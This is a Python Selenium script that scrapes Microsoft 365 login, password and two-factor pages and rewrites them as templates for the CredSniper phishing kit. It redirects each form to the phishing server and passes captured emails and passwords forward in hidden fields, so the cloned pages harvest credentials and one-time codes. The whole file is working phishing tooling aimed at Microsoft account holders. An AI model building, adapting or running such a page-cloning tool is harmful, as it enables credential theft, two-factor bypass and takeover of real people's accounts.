import os, time, platform, shutil
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# system chromedriver path
templates_dir = os.path.join(os.path.dirname(__file__), 'templates')
os.makedirs(templates_dir, exist_ok=True)

HEADLESS = os.getenv('HEADLESS', '0') != '0'

options = Options()
# determine browser binary
browser_candidates = [
    '/usr/bin/chromium',
    '/usr/bin/google-chrome',
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
    shutil.which('chromium'),
    shutil.which('google-chrome'),
    shutil.which('chrome')
]
for b in browser_candidates:
    if b and os.path.exists(b):
        options.binary_location = b
        break

options.add_argument('--disable-blink-features=AutomationControlled')
if HEADLESS:
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')

driver_path_candidates = ['/usr/bin/chromedriver', '/usr/local/bin/chromedriver', '/opt/homebrew/bin/chromedriver']
for p in driver_path_candidates:
    if os.path.exists(p):
        service = Service(p)
        break
else:
    from webdriver_manager.chrome import ChromeDriverManager
    service = Service(ChromeDriverManager().install())

driver = webdriver.Chrome(service=service, options=options)

# Mapping of next_url values for each stage
NEXT_MAP = {
    'login': '/password',
    'password': '/twofactor',
    'twofactor': '/redirect'
}

WAIT = 15

def wait_el(by, value):
    return WebDriverWait(driver, WAIT).until(EC.presence_of_element_located((by, value)))

def patch_html(raw_html: str, stage: str) -> str:
    """Clean Microsoft page so it works in CredSniper templating flow."""
    soup = BeautifulSoup(raw_html, 'html.parser')

    # 1) Remove all external scripts (heavy JS breaks outside MS domain)
    for s in soup.find_all('script'):
        s.decompose()

    # 2) Ensure <base href="https://{{ hostname }}/"> so relative assets load
    if soup.head and not soup.head.find('base'):
        base_tag = soup.new_tag('base')
        base_tag['href'] = 'https://{{ hostname }}/'
        soup.head.insert(0, base_tag)

    # 3) Rewrite the first <form> to point to CredSniper route
    form = soup.find('form')
    if form:
        form['method'] = 'post'
        form['action'] = '{{ next_url }}'

        # Hidden fields to ferry data forward
        if stage == 'password':
            hidden = soup.new_tag('input', type='hidden', name='email', value='{{ email }}')
            form.insert(0, hidden)
        elif stage == 'twofactor':
            hidden_email = soup.new_tag('input', type='hidden', name='email', value='{{ email }}')
            hidden_pass = soup.new_tag('input', type='hidden', name='password', value='{{ password }}')
            form.insert(0, hidden_email)
            form.insert(1, hidden_pass)

    # 4) Add Jinja placeholders for next_url and other vars
    #    (Existing content may reference postUrl etc.; leave them, but our action overrides)
    return soup.prettify()

def save_patched(name):
    raw = driver.page_source
    patched = patch_html(raw, name)
    with open(os.path.join(templates_dir, f'{name}.html'), 'w', encoding='utf-8') as f:
        f.write(patched)

def switch_to_frame_with(by, value):
    driver.switch_to.default_content()
    frames = driver.find_elements(By.TAG_NAME, 'iframe')
    for f in frames:
        driver.switch_to.frame(f)
        try:
            driver.find_element(by, value)
            return True
        except Exception:
            driver.switch_to.default_content()
    return False

try:
    driver.get('https://login.microsoftonline.com/')
    wait_el(By.TAG_NAME, 'body')
    switch_to_frame_with(By.NAME, 'loginfmt') or switch_to_frame_with(By.NAME, 'passwd')
    save_patched('login')

    try:
        wait_el(By.NAME, 'loginfmt').send_keys('test@example.com')
        wait_el(By.ID, 'idSIButton9').click()
        # after click, maybe still in same frame or need to switch again
        if not switch_to_frame_with(By.NAME, 'passwd'):
            pass
        WebDriverWait(driver, WAIT).until(EC.presence_of_element_located((By.NAME, 'passwd')))
        save_patched('password')

        try:
            wait_el(By.NAME, 'passwd').send_keys('DummyPass123!')
            wait_el(By.ID, 'idSIButton9').click()
            switch_to_frame_with(By.CSS_SELECTOR, 'input[type="tel"]')
            # Wait for potential 2FA field (SMS or app code) – look for generic input of type tel or verification code div
            WebDriverWait(driver, 10).until(
                lambda d: d.find_elements(By.CSS_SELECTOR, 'input[type="tel"], input[name*="otc"], input[id*="otc"]') or d.find_elements(By.ID, 'idDiv_SAOTCC_Title')
            )
            save_patched('twofactor')
        except Exception:
            # Could not reach 2FA page
            pass
    except Exception:
        print('Could not advance beyond login page; password/2FA not captured.')
finally:
    driver.quit()

print('Office365 templates refreshed and patched for CredSniper.') 